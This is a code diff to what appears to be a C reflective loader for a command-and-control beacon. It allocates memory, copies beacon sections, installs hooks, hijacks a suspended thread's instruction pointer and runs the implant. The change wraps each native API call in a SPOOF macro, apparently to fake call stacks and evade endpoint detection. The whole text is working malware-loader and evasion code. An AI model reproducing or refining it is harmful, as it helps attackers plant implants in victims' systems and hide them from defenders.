@@ -172,18 +172,18 @@ SECTION( B ) VOID Loader( VOID )
     if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
     {
         calculateRegions( &Reg );
-        Status = Api.ntdll.NtAllocateVirtualMemory( ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
+        Status = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
         if( Status == STATUS_SUCCESS )
         {
             copyStub( MemoryBuffer );
             Map = copyBeaconSections( MemoryBuffer, Reg );
-            BeaconHeap = Api.ntdll.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, NULL, NULL );
+            BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
             fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
             installHooks( Map, MemoryBuffer, Reg.NT );
 
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
             ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
-            Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
+            Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
             if( Status == STATUS_SUCCESS )
             {
                 executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
@@ -228,8 +228,8 @@ SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
     BOOL Suspended = TRUE;
     PVOID StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
 
-    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
-};
+    return SPOOF( pApi->ntdll.RtlCreateUserThread, NULL, NULL, ( HANDLE )-1, NULL, C_PTR( Suspended ), C_PTR( 0 ), C_PTR( 0 ), C_PTR( 0 ), ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
+}
 
 SECTION( B ) VOID Ace( VOID )
 {
@@ -245,11 +245,11 @@ SECTION( B ) VOID Ace( VOID )
         if( NT_SUCCESS( createBeaconThread( &Api, &Thread ) ) )
         {
             Ctx.ContextFlags = CONTEXT_CONTROL;
-            Api.ntdll.NtGetContextThread( Thread, &Ctx );
+            SPOOF( Api.ntdll.NtGetContextThread, NULL, NULL, Thread, &Ctx );
             Ctx.Rip = ( DWORD64 )C_PTR( Loader );
 
-            Api.ntdll.NtSetContextThread( Thread, &Ctx );
-            Api.ntdll.NtResumeThread( Thread, NULL );
+            SPOOF( Api.ntdll.NtSetContextThread, NULL, NULL, Thread, &Ctx );
+            SPOOF( Api.ntdll.NtResumeThread, NULL, NULL, Thread, NULL );
         };
     };
 
